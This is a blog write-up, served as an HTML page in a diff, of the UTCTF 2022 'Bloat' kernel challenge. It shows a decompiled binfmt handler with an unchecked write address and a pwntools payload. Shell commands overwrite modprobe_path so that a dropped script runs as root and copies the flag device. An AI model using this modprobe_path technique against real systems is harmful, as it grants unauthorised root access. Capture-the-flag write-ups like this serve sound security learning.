@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>Bloat</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>Bloat</h1>
+    </header>
+
+    <div class="content">
+        <pre style="background-color:#212733;color:#ccc9c2;"><code><span>I&#39;ve created a new binary format. Unlike ELF, it has no bloat. It just consists of a virtual address to store the data at, then 248 bytes of data. However, when I tried to contribute it back to the mainline kernel they all called my submission &quot;idiotic&quot;, and &quot;wildly unsafe&quot;. They just cant recognize the next generation of Linux binaries.
+</span><span>
+</span><span>Login with username bloat and no password
+</span><span>
+</span><span>By Tristan (@trab on discord)
+</span><span>nc pwn.utctf.live 5003 
+</span></code></pre>
+<p><a href="/utctf-2022/bins/bzImage">bzImage</a>
+<a href="/utctf-2022/bins/rootfs.cpio.gz">rootfs.cpio.gz</a>
+<a href="/utctf-2022/bins/run.sh">run.sh</a></p>
+<p>fuck yeah "wildly unsafe" is my favorite phrase to hear. "A virtual address to store data and then 248 bytes of data" really screams arbitrary write to me. There isn't a lot of complexity to hide vulnerability so I suspected it would be the obvious one -- unchecked virtual address to copy the remainder of the data to. A quick look at run.sh shows that flag.txt is mounted as /dev/sda but that we'll need root to read it.</p>
+<p>Let's pop open the rootfs and see what can be found.</p>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffd580;">mkdir</span><span> rootfs
+</span><span style="color:#f28779;">cd</span><span> rootfs
+</span><span style="color:#ffd580;">gzip</span><span style="color:#ffcc66;"> -cd</span><span> ../rootfs.cpio.gz </span><span style="color:#f29e74;">| </span><span style="color:#ffd580;">cpio</span><span style="color:#ffcc66;"> -idmv
+</span></code></pre>
+<p>Poking around, there's a pretty good amount of stuff here (a minimal linux installation) but we know more or less that we're looking for a kernel module and so we quickly find <code>/lib/modules/5.15.0/extra/bloat.ko</code>. Let's open it up!</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">load_bloat_binary</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#ffcc66;">param_1</span><span>)
+</span><span>
+</span><span>{
+</span><span>  ulong </span><span style="color:#f29e74;">*</span><span>puVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined </span><span style="color:#f29e74;">*</span><span>puVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>  byte </span><span style="color:#f29e74;">*</span><span>pbVar4</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined </span><span style="color:#f29e74;">*</span><span>puVar5</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined </span><span style="color:#f29e74;">*</span><span>puVar6</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> lVar7</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 uVar8</span><span style="color:#ccc9c2cc;">;
+</span><span>  byte </span><span style="color:#f29e74;">*</span><span>pbVar9</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar10</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_GS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">bool</span><span> bVar11</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">bool</span><span> bVar12</span><span style="color:#ccc9c2cc;">;
+</span><span>  byte bVar13</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  bVar13 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  pbVar4 </span><span style="color:#f29e74;">= </span><span>(byte </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#f28779;">strrchr</span><span>(</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">**</span><span>)(param_1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x60</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">L</span><span style="color:#bae67e;">&#39;.&#39;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  bVar11 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">;
+</span><span>  bVar12 </span><span style="color:#f29e74;">=</span><span> pbVar4 </span><span style="color:#f29e74;">== </span><span>(byte </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f29e74;">!</span><span>bVar12) {
+</span><span>    lVar7 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">7</span><span style="color:#ccc9c2cc;">;
+</span><span>    pbVar9 </span><span style="color:#f29e74;">= </span><span>(byte </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#bae67e;">&quot;.bloat&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">do </span><span>{
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(lVar7 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>      lVar7 </span><span style="color:#f29e74;">=</span><span> lVar7 </span><span style="color:#f29e74;">+ -</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      bVar11 </span><span style="color:#f29e74;">= *</span><span>pbVar4 </span><span style="color:#f29e74;">&lt; *</span><span>pbVar9</span><span style="color:#ccc9c2cc;">;
+</span><span>      bVar12 </span><span style="color:#f29e74;">= *</span><span>pbVar4 </span><span style="color:#f29e74;">== *</span><span>pbVar9</span><span style="color:#ccc9c2cc;">;
+</span><span>      pbVar4 </span><span style="color:#f29e74;">=</span><span> pbVar4 </span><span style="color:#f29e74;">+ </span><span>(ulong)bVar13 </span><span style="color:#f29e74;">* -</span><span style="color:#ffcc66;">2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      pbVar9 </span><span style="color:#f29e74;">=</span><span> pbVar9 </span><span style="color:#f29e74;">+ </span><span>(ulong)bVar13 </span><span style="color:#f29e74;">* -</span><span style="color:#ffcc66;">2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>    } </span><span style="color:#ffa759;">while </span><span>(bVar12)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>((</span><span style="color:#f29e74;">!</span><span>bVar11 </span><span style="color:#f29e74;">&amp;&amp; !</span><span>bVar12) </span><span style="color:#f29e74;">==</span><span> bVar11) {
+</span><span>      lVar7 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">generic_file_llseek</span><span>(</span><span style="color:#f29e74;">*</span><span>(undefined8 </span><span style="color:#f29e74;">*</span><span>)(param_1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x40</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffd580;">generic_file_llseek</span><span>(</span><span style="color:#f29e74;">*</span><span>(undefined8 </span><span style="color:#f29e74;">*</span><span>)(param_1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x40</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(lVar7 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x101</span><span>) {
+</span><span>        iVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">begin_new_exec</span><span>(param_1)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(iVar3 </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>          </span><span style="color:#ffa759;">return</span><span> iVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        puVar1 </span><span style="color:#f29e74;">= *</span><span>(ulong </span><span style="color:#f29e74;">**</span><span>)(</span><span style="color:#f29e74;">&amp;</span><span>current_task </span><span style="color:#f29e74;">+</span><span> in_GS_OFFSET)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#f29e74;">*</span><span>(undefined4 </span><span style="color:#f29e74;">*</span><span>)(puVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x6f</span><span>) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffd580;">set_binfmt</span><span>(bloat_fmt)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffd580;">setup_new_exec</span><span>(param_1)</span><span style="color:#ccc9c2cc;">;
+</span><span>        puVar2 </span><span style="color:#f29e74;">= *</span><span>(undefined </span><span style="color:#f29e74;">**</span><span>)(param_1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xa0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>        uVar8 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x7ffffffff000</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#f29e74;">*</span><span>(undefined </span><span style="color:#f29e74;">**</span><span>)(puVar1[</span><span style="color:#ffcc66;">0x62</span><span>] </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xf0</span><span>) </span><span style="color:#f29e74;">=</span><span> puVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(puVar1[</span><span style="color:#ffcc66;">0x62</span><span>] </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xf8</span><span>) </span><span style="color:#f29e74;">= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(puVar1[</span><span style="color:#ffcc66;">0x62</span><span>] </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xf0</span><span>) </span><span style="color:#f29e74;">+</span><span> lVar7</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(((</span><span style="color:#f29e74;">*</span><span>puVar1 </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0x20000000</span><span>) </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#f29e74;">&amp;&amp;
+</span><span>           (uVar8 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0xc0000000</span><span style="color:#ccc9c2cc;">, </span><span>(</span><span style="color:#f29e74;">*</span><span>(byte </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)puVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x37b</span><span>) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">8</span><span>) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>)) {
+</span><span>          uVar8 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0xffffe000</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        iVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">setup_arg_pages</span><span>(param_1</span><span style="color:#ccc9c2cc;">,</span><span>uVar8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(iVar3 </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>          </span><span style="color:#ffa759;">return</span><span> iVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        </span><span style="color:#ffd580;">vm_mmap</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span>puVar2</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x100</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">7</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x12</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffd580;">__put_user_1</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>        iVar10 </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">int</span><span>)lVar7</span><span style="color:#ccc9c2cc;">;
+</span><span>        iVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x100</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(iVar10 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x101</span><span>) {
+</span><span>          iVar3 </span><span style="color:#f29e74;">=</span><span> iVar10</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">&lt;</span><span> iVar10) {
+</span><span>          puVar5 </span><span style="color:#f29e74;">=</span><span> puVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>          </span><span style="color:#ffa759;">do </span><span>{
+</span><span>            puVar6 </span><span style="color:#f29e74;">=</span><span> puVar5 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>            </span><span style="color:#f29e74;">*</span><span>puVar5 </span><span style="color:#f29e74;">=</span><span> puVar5[(param_1 </span><span style="color:#f29e74;">- </span><span>(</span><span style="color:#ffa759;">long</span><span>)puVar2) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xa8</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>            puVar5 </span><span style="color:#f29e74;">=</span><span> puVar6</span><span style="color:#ccc9c2cc;">;
+</span><span>          } </span><span style="color:#ffa759;">while </span><span>((</span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">- </span><span>(</span><span style="color:#ffa759;">int</span><span>)puVar2) </span><span style="color:#f29e74;">+ </span><span>(</span><span style="color:#ffa759;">int</span><span>)puVar6 </span><span style="color:#f29e74;">&lt;</span><span> iVar3)</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        </span><span style="color:#ffd580;">finalize_exec</span><span>(param_1)</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffd580;">start_thread</span><span>(</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(</span><span style="color:#f29e74;">&amp;</span><span>current_task </span><span style="color:#f29e74;">+</span><span> in_GS_OFFSET) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x20</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x3f58</span><span style="color:#ccc9c2cc;">,</span><span>puVar2</span><span style="color:#ccc9c2cc;">,
+</span><span>                     </span><span style="color:#f29e74;">*</span><span>(undefined8 </span><span style="color:#f29e74;">*</span><span>)
+</span><span>                      (</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(</span><span style="color:#f29e74;">*</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(</span><span style="color:#f29e74;">&amp;</span><span>current_task </span><span style="color:#f29e74;">+</span><span> in_GS_OFFSET) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x310</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x120</span><span>))</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return </span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>Ahahahahaha it's literally just that. It maps some RWX memory, copies the bytes from the rest of the file, and then executes. Unfortunately userspace code execution just won't do it so we need to do some kernel funny business to become root. All of this behavior happens as a binfmt handler which triggers for any file named ".bloat".</p>
+<p>I spent a good amount of time researching -- I've never actually done kernel exploitation before. I liked this challenge a lot for being rather easy but enough to sorta take the edge off my fear of kernel exploitation. After a while I found <a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">a blog post on modprobe_path exploitation</a> which immediately looked quite promising.</p>
+<p>Turns out there is a nice "modprobe_path" symbol in the kernel which points to an executable. This executable gets called whenever you try and execute a binary that has no handler. I assume there is a reason but idk why. Good thing for me since this was super easy.</p>
+<p>This challenge was actually even easier than the challenge that blog post went over!  We have true arbitrary write and no kaslr so all I needed to do was grab the address of modprobe_path from /proc/kallsyms and then write a brief payload to overwrite it with my own script to run as root</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>modprobe_path </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0xffffffff82038180</span><span>)
+</span><span>payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span>(modprobe_path)
+</span><span>payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/tmp/x</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(payload)
+</span></code></pre>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#f28779;">echo </span><span style="color:#ffcc66;">-ne </span><span style="color:#bae67e;">&quot;\x80\x81\x03\x82\xff\xff\xff\xff/tmp/x\x00&quot; </span><span style="color:#f29e74;">&gt;</span><span> .bloat
+</span><span style="color:#f28779;">echo </span><span style="color:#ffcc66;">-ne </span><span style="color:#bae67e;">&quot;#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag&quot; </span><span style="color:#f29e74;">&gt;</span><span> x
+</span><span style="color:#f28779;">echo </span><span style="color:#ffcc66;">-ne </span><span style="color:#bae67e;">&quot;\xff\xff\xff\xff&quot; </span><span style="color:#f29e74;">&gt;</span><span> dummy
+</span><span style="color:#ffd580;">chmod</span><span> +x ./bloat
+</span><span style="color:#ffd580;">./bloat
+</span><span style="color:#ffd580;">./dummy
+</span><span>
+</span><span style="color:#ffd580;">cat</span><span> flag
+</span><span style="color:#ffd580;">utflag{oops_forgot_to_use_put_user283558318</span><span>}
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">13 March 2022</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/pwn/">#pwn</a></li>
+                    
+                    <li><a href="https://tsheinen.github.io/tags/kernel/">#kernel</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
